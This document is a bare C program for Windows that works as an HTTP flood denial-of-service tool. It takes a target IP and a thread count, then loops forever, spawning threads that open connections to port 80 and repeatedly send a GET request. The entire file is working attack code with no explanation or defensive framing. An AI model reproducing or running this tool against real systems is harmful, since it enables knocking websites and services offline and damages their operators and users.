#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

char *req, *ip;
struct sockaddr_in sa;

DWORD WINAPI ddog() {
	struct WSAData wsadata;
	WSAStartup(MAKEWORD(2,2), &wsadata);
	SOCKET fd = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
	if(WSAConnect(fd, (struct sockaddr *)&sa, sizeof(sa), 0, 0, 0, 0) != -1) {
		printf("opened %d\n", (int)fd);
		while(send(fd, req, strlen(req), 0) != -1) {
			printf("Sent through %d\n", (int)fd);
		}
		printf("closing %d\n", (int)fd);
	}
	closesocket(fd);
}

int makereq(char **argv) {
	req = malloc(1024);
	sprintf(req, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\n\r\n", argv[1]);
}

int main(int argc, char **argv) {
	int i;
	if(argc < 3) {
		printf("ip threads\n");
		return 0;
	} 
	makereq(argv); 
	sa.sin_addr.s_addr = inet_addr(argv[1]);
	sa.sin_port = htons(80);
	sa.sin_family = AF_INET;
	HANDLE threads[atoi(argv[2])];
	while(1) {
 	for(i = 0; i < atoi(argv[2]); i++) { 
	 threads[i] = CreateThread(0,0,&ddog, 0, 0, 0);	
	}
	for(i = 0; i < atoi(argv[2]); i++) {
	 WaitForSingleObject(threads[i], 0);
	}
  }
}

